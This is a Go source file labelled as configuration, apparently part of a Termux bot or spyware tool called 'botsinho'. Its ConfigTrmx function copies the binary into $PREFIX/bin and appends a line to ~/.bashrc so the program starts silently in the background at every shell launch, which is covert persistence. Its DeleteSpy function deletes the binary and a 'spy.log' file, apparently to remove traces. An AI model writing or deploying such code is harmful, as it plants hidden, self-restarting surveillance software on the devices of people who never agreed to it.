package config

import (
	//"fmt"

	"fmt"
	
	"os/exec"
	"runtime"
	"time"
)



func Systm()string{

	sis := runtime.GOOS
	return sis
}

func ConfigTrmx()(bool){
	path := exec.Command("bash", "-c", "ls $PREFIX/bin|grep -w botsinho")
	
	
	out, _ := path.Output()
	fmt.Println("CONFIGURANDO/,,,,>:"+string(out))

	if(string(out) == ""){
		fmt.Println("configurando...")
		com := exec.Command("bash", "-c", "cp botsinho $PREFIX/bin/")
		com.Output()
		exec.Command("bash", "-c", `echo 'botsinho > /dev/null 2>&1 &' >> ~/.bashrc`).Start()
		time.Sleep(1 * time.Second)
		return true
		
	}else{

		fmt.Println(string(out))
		fmt.Println("OK CONFIG")
		return true
	}
	
	
}




func DeleteSpy(){
	com := exec.Command("bash", "-c", "rm ./botsinho")
	com2 := exec.Command("bash", "-c", "rm spy.log")
	com2.Output()
	com.Output()

	
}